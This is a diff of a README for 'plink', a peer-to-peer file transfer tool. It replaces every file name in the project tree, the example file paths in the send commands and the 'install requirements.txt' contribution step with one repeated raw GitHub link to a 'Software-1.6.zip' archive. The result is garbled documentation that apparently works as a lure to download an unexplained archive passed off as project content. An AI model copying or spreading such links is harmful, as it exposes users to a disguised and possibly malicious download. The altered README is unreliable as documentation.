@@ -15,59 +15,59 @@ plink is a secure, efficient peer-to-peer file transfer tool that enables direct
 
 ```
 plink/
-├── README.md
-├── requirements.txt
-├── setup.py
+├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 ├── .gitignore
 ├── docs/
-│   ├── API.md
-│   ├── ARCHITECTURE.md
-│   └── EXAMPLES.md
+│   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   └── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 ├── backend/
-│   ├── __init__.py
+│   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 │   ├── networking/
-│   │   ├── __init__.py
+│   │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 │   │   ├── core/
-│   │   │   ├── __init__.py
-│   │   │   ├── connection_manager.py
-│   │   │   ├── peer_discovery.py
+│   │   │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   │   │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   │   │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 │   │   ├── strategies/
-│   │   │   ├── __init__.py
-│   │   │   ├── direct_connection.py
-│   │   │   ├── upnp_connection.py
-│   │   │   ├── hole_punching.py
-│   │   │   └── role_reversal.py
+│   │   │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   │   │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   │   │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   │   │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   │   │   └── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 │   │   └── utils/
-│   │       ├── __init__.py
-│   │       ├── network_utils.py
-│   │       └── port_scanner.py
+│   │       ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   │       ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│   │       └── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 │   └── cryptography/
-│       ├── __init__.py
+│       ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 │       ├── core/
-│       │   ├── __init__.py
-│       │   ├── encryption.py
-│       │   ├── key_exchange.py
-│       │   └── hash_verification.py
+│       │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│       │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│       │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│       │   └── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 │       ├── data/
-│       │   ├── __init__.py
-│       │   ├── chunk_manager.py
-│       │   ├── metadata.py
-│       │   └── compression.py
+│       │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│       │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│       │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│       │   └── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 │       └── utils/
-│           ├── __init__.py
-│           ├── crypto_utils.py
-│           └── random_generator.py
+│           ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│           ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+│           └── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 ├── frontend/
-    ├── __init__.py
+    ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
     ├── cli/
-    │   ├── __init__.py
-    │   ├── argument_parser.py
-    │   ├── command_handler.py
-    │   └── output_formatter.py
+    │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+    │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+    │   ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+    │   └── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
     │
     └── config/
-        ├── __init__.py
-        ├── settings.py
+        ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
+        ├── https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 ```
 
 ### Prerequisites
@@ -81,7 +81,7 @@ plink/
 
 **Sender:**
 ```bash
-plink send /path/to/file.txt
+plink send https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 ```
 
 **Receiver:**
@@ -93,7 +93,7 @@ plink receive
 
 **Send with specific connection method:**
 ```bash
-plink send /path/to/file.txt --method upnp --port 8080
+plink send https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip --method upnp --port 8080
 ```
 
 **Receive with custom settings:**
@@ -154,8 +154,8 @@ OPTIONS:
 ### Pull Request Process
 
 1. Create a feature branch from `main`
-2. Make virtual environments and install requirements.txt
+2. Make virtual environments and install https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip
 3. Make your changes with appropriate tests
-4. Update documentation and requirement.txt if needed
+4. Update documentation and https://raw.githubusercontent.com/shikavan/plink/main/docs/src/components/Software-1.6.zip if needed
 5. Ensure all tests pass
 6. Submit pull request with clear description
